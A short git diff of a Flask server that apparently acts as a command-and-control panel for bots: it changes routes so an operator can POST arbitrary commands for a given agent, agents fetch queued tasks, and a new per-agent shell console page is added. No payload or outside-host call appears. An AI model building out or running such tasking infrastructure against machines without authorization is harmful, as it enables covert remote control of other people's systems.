@@ -31,7 +31,7 @@ def status():
         return jsonify({"status":"update"})
 
 @bp.route("/task/<bot_id>", methods=["GET"])
-def get_task(bot_id):
+def send_task(bot_id):
     if bot_id in tasks and tasks[bot_id]:
         payload = tasks[bot_id].copy()
         tasks[bot_id] = []
@@ -39,10 +39,10 @@ def get_task(bot_id):
         return jsonify({"task": payload})
     return jsonify({"task":None})
 
-@bp.route("/send_task",methods=["GET"])
-def task():
-    bot_id = "Test"
-    command = "ping"
+@bp.route("/create_task",methods=["POST"])
+def create_task():
+    bot_id = request.form["agent_id"]
+    command = request.form["command"]
 
     if bot_id not in tasks:
         tasks[bot_id] = []
@@ -57,3 +57,7 @@ def task():
 @bp.route("/dashboard", methods=["GET"])
 def dashboard():
     return render_template("pages/dashboard.html", bots= agents)
+
+@bp.route("/agent/<agent_id>/console", methods=["GET"])
+def console(agent_id):
+    return render_template("pages/shell.html", id=agent_id)
